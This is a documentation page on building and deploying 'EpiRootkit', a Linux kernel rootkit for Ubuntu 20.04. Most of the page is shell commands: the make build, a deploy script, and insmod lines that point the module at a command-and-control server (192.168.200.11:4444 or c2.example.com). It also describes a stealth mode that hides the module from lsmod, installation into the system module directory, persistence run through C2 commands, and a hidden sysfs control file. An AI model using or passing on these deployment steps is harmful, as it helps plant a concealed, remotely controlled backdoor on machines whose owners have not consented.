---
title: "Build & Deployment"
description: "How to build and load EpiRootkit on Ubuntu 20.04"
icon: "code"
date: "2025-05-07T00:44:31+01:00"
lastmod: "2025-05-25T00:00:00+01:00"
draft: false
toc: true
weight: 502
---



## Requirements

### System
- **OS**: Ubuntu 20.04 LTS
- **Kernel**: 5.4.0-* (check with `uname -r`)

### Dependencies
```bash
sudo apt update
sudo apt install -y build-essential linux-headers-$(uname -r)
```


## Build

### Using Deploy Script (Recommended)
```bash
# Build rootkit using main deployment script
./deploy_c2.sh --rootkit
```

### Manual Build
```bash
cd rootkit
make clean && make
# ✓ Build successful: epirootkit.ko created
```

## Deployment

### Deployment Script

```bash
# Basic deployment (uses ./epirootkit.ko automatically)
cd rootkit
sudo ./deploy_rootkit.sh

# Custom C2 server
sudo ./deploy_rootkit.sh -a 192.168.200.11 -p 4444

# Domain-based deployment  
sudo ./deploy_rootkit.sh -a c2.example.com

# Custom module file
sudo ./deploy_rootkit.sh -m /path/to/epirootkit.ko
```

### Deployment Commands
| Command | Description |
|---------|-------------|
| `deploy` | Install and load module (default) |
| `status` | Check current module status |
| `uninstall` | Remove module completely |
| `help` | Show detailed help |

### Deployment Options
| Option | Description |
|--------|-------------|
| `-m, --module FILE` | Specify module file (default: ./epirootkit.ko) |
| `-a, --address ADDR` | C2 server address (default: 192.168.200.11) |
| `-p, --port PORT` | C2 server port (default: 4444) |
| `-h, --help` | Show help message |

### Advanced Usage
```bash
# Custom deployment with domain
sudo ./deploy_rootkit.sh -a c2.example.com -p 443

# Check deployment status
sudo ./deploy_rootkit.sh status
# Module is loaded and visible
# OR: Module is loaded and hidden (stealth mode active)

# Remove deployment
sudo ./deploy_rootkit.sh uninstall
# Module uninstalled
```

### Manual Loading (Alternative)
```bash
# Load with domain  
sudo insmod epirootkit.ko address=c2.example.com

# Load with IP and port
sudo insmod epirootkit.ko address=192.168.200.11 port=4444

# Load with defaults from config
sudo insmod epirootkit.ko
```

## Module Status Detection

The deployment script can detect module status even when hidden:

### Status Checking
- **Visible module**: Detected via `lsmod` output
- **Hidden module**: Detected via sysfs interface `/sys/kernel/epirootkit/control`
- **Not loaded**: No traces found in either location

## Management

### Check Status
```bash
cd rootkit
sudo ./deploy_rootkit.sh status
# Module is loaded and visible
# OR: Module is loaded and hidden (stealth mode active)
```

### Default Behavior
- **Module file**: Uses `./epirootkit.ko` by default
- **C2 address**: Uses `192.168.200.11:4444` by default  
- **Installation**: Module copied to `/lib/modules/$(uname -r)/extra/`
- **Persistence**: Managed through C2 commands after connection

### Complete Removal
```bash
cd rootkit
sudo ./deploy_rootkit.sh uninstall
# Module removed from memory
# Module removed from system
# Module uninstalled
```

**Domain Support**: The rootkit supports both domain names and IP addresses. For DNS resolution details, see [DNS Resolution](./features/dns-resolution.md).